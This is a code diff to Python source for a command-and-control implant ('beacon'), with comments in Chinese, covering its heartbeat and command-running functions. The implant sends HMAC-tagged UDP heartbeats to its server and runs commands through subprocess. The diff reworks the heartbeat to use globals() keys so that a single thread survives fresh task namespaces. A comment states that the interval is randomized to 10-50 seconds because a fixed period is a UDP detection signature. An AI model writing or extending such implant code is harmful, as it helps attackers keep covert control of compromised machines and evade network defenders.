@@ -64,15 +64,17 @@ def _hb_start():
     """长任务心跳：每 30s 向 server 的 UDP 同端口发心跳（21）。
 
     防长任务期间 server 端 show 误判离线；依赖 beacon 全局 _D/_H/_P。
+    心跳开关走 globals() 字符串键(植入物全局): 任务跑在专用命名空间里,
+    模块级变量每次执行都是新的, 只有字符串键才能"只启一个心跳线程"。
     """
-    global _hb_go, _hb_stop_ev
-    if _hb_go:
+    G = globals()
+    if G.get("_hb_go"):
         return
     try:
         import socket as _s
         import threading as _th
-        _hb_go = True
-        _hb_stop_ev = _th.Event()
+        G["_hb_go"] = True
+        G["_hb_stop_ev"] = _th.Event()
 
         def _beat():
             try:
@@ -80,7 +82,7 @@ def _hb_start():
                 import hashlib as _hl
                 u = _s.socket(_s.AF_INET, _s.SOCK_DGRAM)
                 u.settimeout(2)
-                while not _hb_stop_ev.is_set():
+                while not G["_hb_stop_ev"].is_set():
                     try:
                         # M4：心跳带 HMAC(_K, bid) 前 8 字节，防伪造刷新
                         mac = _hm.new(_K, _D.encode(), _hl.sha256).digest()[:8]
@@ -96,7 +98,7 @@ def _hb_start():
                     except OSError:
                         pass
                     # 间隔随机 10-50s(原固定 30s,固定周期是 UDP 检测特征)
-                    _hb_stop_ev.wait(rnd.uniform(10, 50))
+                    G["_hb_stop_ev"].wait(rnd.uniform(10, 50))
                 u.close()
             except Exception:
                 pass
@@ -107,15 +109,12 @@ def _hb_start():
 
 
 def _hb_stop():
-    global _hb_go
+    G = globals()
     try:
-        _hb_stop_ev.set()
-    except NameError:
+        G["_hb_stop_ev"].set()
+    except (KeyError, NameError):
         pass
-    _hb_go = False
-
-
-_hb_go = False
+    G["_hb_go"] = False
 
 
 def _run(argv, cmd, timeout=None):
@@ -124,7 +123,7 @@ def _run(argv, cmd, timeout=None):
     try:
         proc = subprocess.Popen(
             argv,
-            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
+            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True,
         )
         if timeout:
             try:
